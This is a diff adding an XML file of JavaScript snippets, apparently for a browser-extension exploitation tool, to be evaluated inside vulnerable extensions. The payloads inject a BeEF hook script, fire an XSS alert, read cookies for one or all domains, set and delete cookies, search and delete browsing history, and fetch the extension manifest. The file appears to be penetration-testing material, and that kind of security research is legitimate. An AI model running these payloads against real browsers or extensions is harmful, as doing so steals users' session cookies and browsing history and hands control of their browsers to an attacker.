@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8"?>
+<snippets>
+<snippet type="eval-snippets" name="xhr">
+x = new XMLHttpRequest();
+x.onreadystatechange = function() {
+if (x.readyState == 4) {
+   __p.postMessage({cmd:'recveval', p: x.responseText});
+}
+};
+x.open('GET','/',true);
+x.send(null);
+</snippet>
+<snippet type="eval-snippets" name="alert">alert(/xss/);</snippet>
+<snippet type="eval-snippets" name="location">location;</snippet>
+<snippet type="eval-snippets" name="list scripts">
+var s = [];
+for (i=0;i&lt;document.scripts.length;i++) {
+s.push(document.scripts[i].src || document.scripts[i].textContent);
+}
+s;
+</snippet>
+<snippet type="eval-snippets" name="add script">
+(function() {
+var d=document;
+var s = d.createElement('script');
+s.src = 'script.js';
+d.body.appendChild(s);
+})();
+</snippet>
+<snippet type="eval-snippets" name="BeEF init part 1">
+(function() {
+var d=document;
+var s = d.createElement('script');
+s.src = 'http://127.0.0.1:3000/hook.js'; // BeEF hook here
+d.body.appendChild(s);
+})();
+</snippet>
+<snippet type="eval-snippets" name="BeEF init part 2">beef_init(); // eval this outside sandbox</snippet>
+<snippet type="eval-ext-snippets" name="get cookies">
+//extension needs cookies permission
+chrome.cookies.getAll({
+  // comment out following line to get cookies for all domains
+  url:"https://www.google.com/"
+}, function(cookies) {
+  log({type:"recveval",result: cookies});
+})
+</snippet>
+<snippet type="eval-ext-snippets" name="set cookie">
+//extension needs cookies permission
+chrome.cookies.set({
+  url: 'https://www.google.com/',
+  name: 'test-chef',
+  value: 'test-ok',
+  secure: true,
+  httpOnly: true,
+  expirationDate: 1417390624, // unix timestamp or null for session cookie
+  path: '/'
+}, function(c) {
+  log({type:'recveval',result: c});
+})
+</snippet>
+<snippet type="eval-ext-snippets" name="remove cookie">
+//extension needs cookies permission
+chrome.cookies.remove({
+  url: 'https://www.google.com/',
+  name: 'test-chef'
+}, function(c) {
+  log({type:'recveval',result: c});
+})
+</snippet>
+<snippet type="eval-ext-snippets" name="have you visited google?">
+// requires history permission
+chrome.history.getVisits({
+  url: 'http://www.google.com/'
+}, function(visits) {
+  log({type:'recveval',result: visits});
+});
+</snippet>
+<snippet type="eval-ext-snippets" name="search history">
+// requires history permission
+chrome.history.search({
+  text: 'google'
+}, function(r) {
+  log({type:'recveval',result: r});
+})
+</snippet>
+<snippet type="eval-ext-snippets" name="delete URL from history">
+// requires history permission
+chrome.history.deleteUrl({
+  url: 'http://www.example.com/'
+})
+</snippet>
+<snippet type="eval-ext-snippets" name="do I have file:// access?">
+chrome.extension.isAllowedFileSchemeAccess(function(yes) {
+    log({type:'recveval',result: yes});
+})
+</snippet>
+<snippet type="eval-ext-snippets" name="get manifest">
+x = new XMLHttpRequest();
+x.onreadystatechange = function() {
+   var d;
+  try {
+    d=JSON.parse(x.responseText);
+ } catch (e) {d=x.responseText}
+if (x.readyState == 4) {
+   log({type:'recveval', result:d});
+}
+};
+x.open('GET','/manifest.json',true);
+x.send(null);
+</snippet>
+</snippets>
